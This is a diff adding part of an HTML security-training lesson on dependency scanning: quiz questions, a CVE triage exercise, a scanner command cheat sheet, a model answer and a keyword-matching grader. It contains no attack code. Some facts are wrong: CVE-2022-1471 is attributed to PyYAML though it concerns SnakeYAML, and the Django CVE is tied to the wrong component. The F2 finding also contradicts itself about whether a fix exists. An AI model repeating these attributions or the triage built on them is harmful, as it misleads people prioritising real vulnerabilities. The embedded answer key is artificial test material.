+    <div class="quiz-exp" id="q1-exp">The developer is making a common mistake: conflating "not called directly by us" with "not reachable." A transitive dependency is called transitively &mdash; through the direct dependency. The question is whether the direct dependency's usage in your code eventually calls the vulnerable function. This requires actual call graph analysis, not just checking whether you import the transitive package directly. Additionally: even if genuinely not reachable today, code changes tomorrow. Maintaining a policy of "fix transitive CVEs when they have available patches" is the correct posture, with reachability analysis informing priority and SLA rather than suppression.</div>
+  </div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q2. Explain the dependency confusion attack. What is the specific technical reason it works, and what is the single most important configuration fix?</div>
+    <div class="quiz-opts" id="q2">
+      <div class="qo" onclick="doQ('q2',this,'wrong')">An attacker typosquats a popular package name (e.g. "reqests" instead of "requests") hoping developers mistype it</div>
+      <div class="qo" onclick="doQ('q2',this,'wrong')">An attacker compromises the maintainer account of a popular package and pushes a malicious update</div>
+      <div class="qo" onclick="doQ('q2',this,'correct')">An attacker registers a package on the public registry (PyPI, npmjs) with the same name as your internal private package, but with a higher version number. When pip or npm is configured with --extra-index-url, it checks both the private and public registry and selects the highest available version. The attacker's version 9999.0.0 wins over your internal 1.2.3. The single most important fix: use --index-url instead of --extra-index-url, which makes the private registry the only source with no public fallback. Also: namespace your private packages and register placeholder packages on public registries.</div>
+      <div class="qo" onclick="doQ('q2',this,'wrong')">An attacker injects malicious code into a legitimate package during the build and publish pipeline of a popular open source project</div>
+    </div>
+    <div class="quiz-exp" id="q2-exp">Dependency confusion (discovered by Alex Birsan in 2021) exploits a specific behaviour of pip, npm, and similar tools when configured with multiple registries. The extra-index-url behaviour treats all configured registries equally and selects the highest version number from any of them. An attacker who knows your internal package name (from a leaked requirements.txt, job posting, or GitHub error log) publishes a malicious package with the same name on the public registry with version 99999.0.0. Your build system picks it over your internal v1.2.3. The --index-url flag solves this by replacing the default registry entirely, so only your private registry is consulted. Namespace prefixes and claiming public package names are defence in depth.</div>
+  </div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q3. Why should you scan the lock file (requirements.lock, package-lock.json) rather than the manifest (requirements.txt, package.json) for vulnerabilities?</div>
+    <div class="quiz-opts" id="q3">
+      <div class="qo" onclick="doQ('q3',this,'wrong')">Lock files are more recent so they have up-to-date version information</div>
+      <div class="qo" onclick="doQ('q3',this,'wrong')">Manifests cannot be parsed by most scanners; lock files use a standardised format</div>
+      <div class="qo" onclick="doQ('q3',this,'correct')">The manifest lists only your direct dependencies and often uses version ranges rather than exact versions. The lock file records the exact resolved version of every package in the full transitive dependency tree. Scanning only the manifest misses all transitive vulnerabilities &mdash; which is where Log4Shell, the most damaging recent supply chain vulnerability, lived for thousands of applications. The lock file is the ground truth of what is actually installed.</div>
+      <div class="qo" onclick="doQ('q3',this,'wrong')">Lock files include hash verification so the scanner can confirm integrity</div>
+    </div>
+    <div class="quiz-exp" id="q3-exp">This is the most operationally important concept in dependency scanning. The manifest is your shopping list; the lock file is the receipt of what you actually got, including everything that came in as a dependency of a dependency. Log4Shell is the canonical example: the affected applications had no direct dependency on log4j. It arrived as a transitive dependency, sometimes 4-5 hops deep in the dependency tree. Organisations that scanned only their manifests had no idea log4j was in their stack. The lock file is the complete picture. Always scan the lock file. Always commit the lock file to version control.</div>
+  </div>
+</div>
+
+<!-- CHALLENGE -->
+<div class="challenge">
+  <div class="ch-ey">Capstone Challenge &mdash; Triage 5 Findings &amp; Design a Programme</div>
+  <div class="ch">
+    <h3>Triage these scan results and design a 20-repo programme</h3>
+    <p class="ch-desc">Part 1: Triage each finding below and give your action recommendation. Part 2: Design the dependency scanning programme for a 20-repository Python/Node.js/Java organisation that currently has no scanning in place.</p>
+    <div class="scenario">
+      <p><strong>Findings to triage:</strong><br><br>
+      <strong>F1.</strong> PyYAML 5.4.1 &mdash; CVE-2022-1471 &mdash; CVSS 9.8 &mdash; Arbitrary code execution via yaml.load() with FullLoader. Your codebase calls <code>yaml.safe_load()</code> exclusively.<br><br>
+      <strong>F2.</strong> Django 4.0.0 &mdash; CVE-2023-41164 &mdash; CVSS 7.5 &mdash; Potential denial-of-service in Internationalization component (django.utils.translation). Fix available: Django 4.2.6. Your app is a REST API that does not use Django i18n. No fix_versions in pip-audit output (disputed CVE).<br><br>
+      <strong>F3.</strong> Pillow 9.2.0 &mdash; CVE-2023-44271 &mdash; CVSS 7.5 &mdash; Uncontrolled resource consumption when processing crafted TIFF images. Your app accepts user image uploads and processes them with Pillow. Fix available: Pillow 10.0.1.<br><br>
+      <strong>F4.</strong> cryptography 39.0.0 &mdash; CVE-2023-49083 &mdash; CVSS 4.0 &mdash; NULL pointer dereference in PKCS12 parsing on some platforms. Your app uses cryptography for JWT signing (RSA keys), not PKCS12. Fix available: cryptography 41.0.6.<br><br>
+      <strong>F5.</strong> certifi 2022.12.7 &mdash; CVE-2023-37920 &mdash; CVSS 9.8 &mdash; Certifi removes root certificates. Your application makes HTTPS calls to external APIs using requests, which uses certifi internally.</p>
+    </div>
+    <textarea id="ch-ans" placeholder="F1 - PyYAML: Priority / Action / Reasoning: ...
+F2 - Django i18n: Priority / Action / Reasoning: ...
+F3 - Pillow TIFF: Priority / Action / Reasoning: ...
+F4 - cryptography PKCS12: Priority / Action / Reasoning: ...
+F5 - certifi CA: Priority / Action / Reasoning: ...
+
+Part 2 - Programme design for 20 repos:
+Tools chosen: ...
+Rollout order: ...
+CI gate policy: ...
+Remediation SLAs: ..."></textarea>
+    <div class="btn-row">
+      <button class="btn btn-p" onclick="checkCh()">Submit</button>
+      <button class="btn btn-g" onclick="revealCh()">Reveal model answer</button>
+    </div>
+    <div class="ch-fb" id="ch-fb"></div>
+  </div>
+</div>
+
+<!-- SUMMARY -->
+<div class="section">
+  <div class="eyebrow">Quick Reference</div>
+  <div class="sec-title">Dependency scanning cheat sheet</div>
+  <table>
+    <tr><th>Ecosystem</th><th>Manifest</th><th>Lock file</th><th>Primary scanner</th><th>CI command</th></tr>
+    <tr><td style="font-weight:700;color:var(--accent)">Python</td><td>requirements.txt / pyproject.toml</td><td>requirements.lock / poetry.lock</td><td>pip-audit</td><td><code>pip-audit -r requirements.lock --format json</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--green)">Node.js</td><td>package.json</td><td>package-lock.json / yarn.lock</td><td>npm audit</td><td><code>npm audit --audit-level=high --json</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--teal)">Go</td><td>go.mod</td><td>go.sum</td><td>govulncheck</td><td><code>govulncheck -json ./...</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--red)">Ruby</td><td>Gemfile</td><td>Gemfile.lock</td><td>bundler-audit</td><td><code>bundle-audit update &amp;&amp; bundle-audit check</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--purple)">Java</td><td>pom.xml / build.gradle</td><td>N/A (resolved at build)</td><td>OWASP DC / Snyk</td><td><code>dependency-check.sh --failOnCVSS 7</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--blue-bg);color:var(--accent)">Rust</td><td>Cargo.toml</td><td>Cargo.lock</td><td>cargo-audit</td><td><code>cargo audit --deny warnings</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--orange)">.NET</td><td>.csproj</td><td>packages.lock.json</td><td>dotnet CLI</td><td><code>dotnet list package --vulnerable --include-transitive</code></td></tr>
+    <tr><td style="font-weight:700;color:var(--pink)">Multi-lang</td><td>Any</td><td>Any</td><td>Snyk / OWASP DC</td><td><code>snyk test --severity-threshold=high</code></td></tr>
+  </table>
+</div>
+
+<!-- NAV FOOTER -->
+<div class="nav-footer">
+  <a class="nf-btn" href="#"><span class="nf-dir">&larr; Previous</span><span class="nf-title">13 &mdash; Container Security</span></a>
+  <a class="nf-btn next" href="#"><span class="nf-dir">Next Lesson &rarr;</span><span class="nf-title">15 &mdash; SBOM</span></a>
+</div>
+
+</div>
+</div>
+
+<!-- REVEAL HTML stored in hidden DOM - zero HTML in JS strings -->
+<div id="reveal-html" style="display:none">
+<strong>Model Answer &mdash; Part 1: Finding Triage</strong><br><br>
+<strong>F1 &mdash; PyYAML CVE-2022-1471 (CVSS 9.8): LOW URGENCY</strong><br>
+This CVE affects yaml.load() with FullLoader when processing untrusted input. Your codebase uses yaml.safe_load() exclusively. safe_load() does not allow arbitrary Python object instantiation and is not vulnerable to this CVE. The reachability analysis is clear: the vulnerable code path is not called. Action: upgrade PyYAML to a patched version in the next scheduled release cycle (it costs nothing to upgrade), but this is not a blocker or emergency. Document the assessment in your suppression file with the reasoning. Add a Semgrep rule to alert if yaml.load() is introduced in future code.<br><br>
+<strong>F2 &mdash; Django CVE-2023-41164 (CVSS 7.5): INVESTIGATE + LOW URGENCY</strong><br>
+Two signals point to low urgency: (1) your app does not use Django i18n, making the vulnerable code path unreachable in your deployment, and (2) pip-audit reports no fix_versions, suggesting this may be disputed or the advisory is not yet in pip-audit's database. Action: check the Django security advisory directly to confirm the CVE status. If confirmed as affecting django.utils.translation and your app truly never calls translation functions, document as low-priority. Schedule upgrade to Django 4.2.6 in the next regular sprint. If dispute is confirmed, add to suppression file with link to Django's advisory.<br><br>
+<strong>F3 &mdash; Pillow CVE-2023-44271 (CVSS 7.5): HIGH URGENCY, BLOCK DEPLOY</strong><br>
+This is the most urgent finding. The vulnerability is in TIFF image processing. Your app accepts user image uploads and processes them with Pillow. User-controlled input flows directly to the vulnerable code path. An attacker can upload a crafted TIFF and cause resource exhaustion, potentially taking down your service. A fix is available (Pillow 10.0.1). Action: treat as HIGH priority. Fix within 7 days, or immediately if deploy cadence allows. Add an input validation gate (only accept JPEG/PNG/WebP, reject TIFF) as a compensating control while upgrade is in progress. This is the canonical case for acting on a finding despite a modest 7.5 CVSS score: user input + vulnerable code path + available fix = fix now.<br><br>
+<strong>F4 &mdash; cryptography CVE-2023-49083 (CVSS 4.0): LOW URGENCY</strong><br>
+The vulnerability is in PKCS12 parsing. Your app uses the cryptography library only for JWT signing with RSA keys (which uses the RSA and serialization modules, not PKCS12). The vulnerable function is not in your code's call path. Additionally, CVSS 4.0 indicates limited impact even when exploitable. A fix is available and cheap to apply. Action: upgrade to cryptography 41.0.6 in the next regular release. No emergency. Document the reachability assessment. Note: even though not reachable now, upgrading is always correct when a fix is available &mdash; the code path could change.<br><br>
+<strong>F5 &mdash; certifi CVE-2023-37920 (CVSS 9.8): MEDIUM-HIGH URGENCY</strong><br>
+Despite the CVSS 9.8 score, this CVE has a specific and context-dependent nature: certifi removed trust for certain root CA certificates that were previously trusted. If those CAs issued certificates used by your third-party API endpoints, your HTTPS calls could fail after upgrade (not before). The risk of NOT upgrading: if those distrusted CAs were distrusted for good reason (compromise or policy violation), you may be trusting fraudulent certificates. Action: upgrade certifi promptly (within 7 days), but test your HTTPS calls to all third-party APIs in staging first to ensure none use the affected CA certificates. This is a case where the fix could cause breakage, so test before deploying to production.<br><br>
+<strong>Part 2 &mdash; 20-Repository Programme Design</strong><br><br>
+Tools: pip-audit for Python, npm audit + audit-ci for Node.js, OWASP Dependency-Check for Java (handles Maven/Gradle). Snyk as the unified dashboard for continuous monitoring across all ecosystems. Dependabot for automated update PRs on all 20 repos.<br><br>
+Rollout order: Week 1-2: Enable GitHub Dependabot security alerts on all 20 repos (zero effort, free, immediate vulnerability visibility). Enable Snyk monitor on all 20 repos in monitor-only mode to baseline current state. Week 3-4: Add pip-audit and npm audit to CI in warn-only mode for all repos. Generate baseline report: how many HIGH/CRITICAL fixable vulns across the 20 repos. Week 5-8: Work through the baseline backlog with development teams. Fix all CRITICAL fixable vulns first, then HIGH. Week 9-10: Switch CI scanning from warn-only to blocking for CRITICAL. Week 11-12: Switch to blocking for HIGH.<br><br>
+CI gate policy: Block on CRITICAL vulnerabilities with available fix versions (zero tolerance). Block on HIGH vulnerabilities with available fix versions (SLA: 7 days from detection). Warn on MEDIUM (SLA: 30 days). No action required on LOW unless fix is trivial. Scheduled daily scan in addition to PR gate (catches newly published CVEs in existing deps). License compliance gate: block if GPL/AGPL found in repositories with proprietary code.<br><br>
+Remediation SLAs: CRITICAL fixable: 72 hours. HIGH fixable: 7 days. MEDIUM: 30 days. LOW: next regular release cycle. CRITICAL with no fix available: document, add compensating control, rescan weekly. Reporting: weekly email to engineering leads with open findings count by severity and age.
+</div>
+
+<!-- JAVASCRIPT - no HTML in JS strings -->
+<script>
+function tp(id) {
+  document.getElementById(id).classList.toggle('open');
+}
+document.getElementById('pan-graph').classList.add('open');
+document.getElementById('pan-lockfiles').classList.add('open');
+
+function switchTab(btn, paneId) {
+  var bar = btn.parentElement;
+  bar.querySelectorAll('.ttab').forEach(function(t) { t.classList.remove('active'); });
+  btn.classList.add('active');
+  var wrap = bar.parentElement;
+  wrap.querySelectorAll('.tool-pane').forEach(function(p) { p.classList.remove('active'); });
+  var pane = document.getElementById(paneId);
+  if (pane) { pane.classList.add('active'); }
+}
+
+function doQ(qid, el, result) {
+  var container = document.getElementById(qid);
+  container.querySelectorAll('.qo').forEach(function(o) { o.onclick = null; });
+  el.classList.add(result === 'correct' ? 'correct' : 'wrong');
+  var exp = document.getElementById(qid + '-exp');
+  if (exp) { exp.classList.add('show'); }
+}
+
+function checkCh() {
+  var ans = document.getElementById('ch-ans').value.toLowerCase();
+  var fb  = document.getElementById('ch-fb');
+  var checks = [
+    (ans.includes('f1') || ans.includes('pyyaml')) && (ans.includes('safe_load') || ans.includes('not reachable') || ans.includes('low') || ans.includes('safe')),
+    (ans.includes('f2') || ans.includes('django')) && (ans.includes('i18n') || ans.includes('not used') || ans.includes('disputed') || ans.includes('investigate')),
+    (ans.includes('f3') || ans.includes('pillow')) && (ans.includes('urgent') || ans.includes('high') || ans.includes('user') || ans.includes('upload') || ans.includes('block')),
+    (ans.includes('f4') || ans.includes('cryptography') || ans.includes('pkcs12')) && (ans.includes('pkcs') || ans.includes('not') || ans.includes('low') || ans.includes('jwt')),
+    (ans.includes('f5') || ans.includes('certifi')) && (ans.includes('ca') || ans.includes('upgrade') || ans.includes('test') || ans.includes('certificate')),
+    ans.includes('dependabot') || ans.includes('snyk') || (ans.includes('pip-audit') && ans.includes('npm')),
+    ans.includes('sla') || ans.includes('critical') || (ans.includes('72') || ans.includes('7 day') || ans.includes('30 day')),
+    ans.includes('warn') || ans.includes('monitor') || ans.includes('baseline') || ans.includes('rollout')
+  ];
+  var score = checks.filter(Boolean).length;
+  fb.className = 'ch-fb show ' + (score >= 6 ? 'good' : 'hint');
+  if (score >= 6) {
+    fb.textContent = 'Excellent — ' + score + '/8 areas covered. You are thinking about dependency scanning the right way: reachability and context determine urgency, not raw CVSS score. The key insight in this set of findings is that F3 (Pillow) is the most urgent despite having the lowest CVSS of the user-facing issues, because the combination of user-controlled input flowing to the vulnerable function makes it directly exploitable. F1 (PyYAML) has CVSS 9.8 but is not reachable because safe_load is used. Raw CVSS score without context misleads teams into fixing the wrong things first.';
+  } else if (score >= 3) {
+    fb.textContent = 'Good work — ' + score + '/8 covered. Key triage points to revisit: F1 (PyYAML CVSS 9.8) is low urgency because yaml.safe_load() is not vulnerable to this CVE — the 9.8 score applies to yaml.load(). F3 (Pillow CVSS 7.5) is the most urgent because user input reaches the vulnerable code path. F5 (certifi) needs testing before deploying the fix because upgrading could break HTTPS calls to APIs using affected CAs. For the programme design: always start with Dependabot alerts (zero effort, immediate visibility) before adding CI gates.';
+  } else {
+    fb.textContent = 'For each finding, ask: (1) Does the vulnerable code path get called in our app? (2) Is user input involved? (3) Is there a fix available? A CVSS 9.8 finding where the vulnerable function is not called is lower priority than a CVSS 7.5 finding where user input flows directly to the vulnerable function. For the programme design: think about the order of rollout (monitor before block) and what SLAs to set for each severity level.';
+  }
+}
+
+function revealCh() {
+  var fb  = document.getElementById('ch-fb');
+  var src = document.getElementById('reveal-html');
+  fb.className = 'ch-fb show reveal';
+  fb.innerHTML = src ? src.innerHTML : 'Model answer unavailable.';
+}
+</script>
+</body>
+</html>
